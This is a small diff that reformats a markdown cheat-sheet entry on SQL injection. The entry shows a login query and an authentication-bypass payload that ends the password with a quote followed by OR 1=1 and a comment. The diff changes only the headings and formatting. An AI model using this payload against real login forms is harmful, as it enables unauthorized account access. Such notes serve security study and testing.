@@ -1,12 +1,12 @@
--------------SQL Injection---------------------
+----------------------------------
+# SQL Injection
 
-Authentication Bypass Variant 1
-
-query:
+## Authentication Bypass Variant 1
+### query:
 SELECT * FROM users WHERE username='admin' AND password='pass'
 
-payload:
+### payload:
 username:admin
 password:pass' OR 1=1 -- +
 
-NOTE: + is similar to space
+**NOTE:** + is similar to space
